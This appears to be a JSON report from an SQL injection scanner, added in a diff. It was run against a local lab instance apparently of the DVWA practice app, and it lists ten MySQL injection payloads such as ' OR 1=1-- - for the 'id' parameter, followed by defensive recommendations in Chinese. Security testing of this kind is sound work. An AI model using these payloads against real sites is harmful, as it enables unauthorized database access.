@@ -1,0 +1,88 @@
+{
+  "scan_summary": {
+    "target_url": "http://192.168.26.130:8085/vulnerabilities/sqli/?id=1&Submit=Submit",
+    "scan_time": "2025-11-18 21:21:03",
+    "parameters_tested": 1,
+    "injection_points_found": 10,
+    "total_vulnerabilities": 10
+  },
+  "vulnerabilities": [
+    {
+      "parameter": "id",
+      "type": "error_based",
+      "db_type": "mysql",
+      "confidence": "high",
+      "payload": "''"
+    },
+    {
+      "parameter": "id",
+      "type": "error_based",
+      "db_type": "mysql",
+      "confidence": "high",
+      "payload": "`"
+    },
+    {
+      "parameter": "id",
+      "type": "error_based",
+      "db_type": "mysql",
+      "confidence": "high",
+      "payload": "\\'"
+    },
+    {
+      "parameter": "id",
+      "type": "error_based",
+      "db_type": "mysql",
+      "confidence": "high",
+      "payload": "\""
+    },
+    {
+      "parameter": "id",
+      "type": "error_based",
+      "db_type": "mysql",
+      "confidence": "high",
+      "payload": "\\\""
+    },
+    {
+      "parameter": "id",
+      "type": "error_based",
+      "db_type": "mysql",
+      "confidence": "high",
+      "payload": ";"
+    },
+    {
+      "parameter": "id",
+      "type": "error_based",
+      "db_type": "mysql",
+      "confidence": "high",
+      "payload": "' OR '1'='1"
+    },
+    {
+      "parameter": "id",
+      "type": "error_based",
+      "db_type": "mysql",
+      "confidence": "high",
+      "payload": "' OR 'a'='a"
+    },
+    {
+      "parameter": "id",
+      "type": "error_based",
+      "db_type": "mysql",
+      "confidence": "high",
+      "payload": "' OR 1=1#"
+    },
+    {
+      "parameter": "id",
+      "type": "error_based",
+      "db_type": "mysql",
+      "confidence": "high",
+      "payload": "' OR 1=1-- -"
+    }
+  ],
+  "recommendations": [
+    "使用参数化查询或预编译语句",
+    "实施输入验证和过滤",
+    "使用Web应用防火墙(WAF)",
+    "最小权限原则配置数据库账户",
+    "定期进行安全测试和代码审计"
+  ]
+}
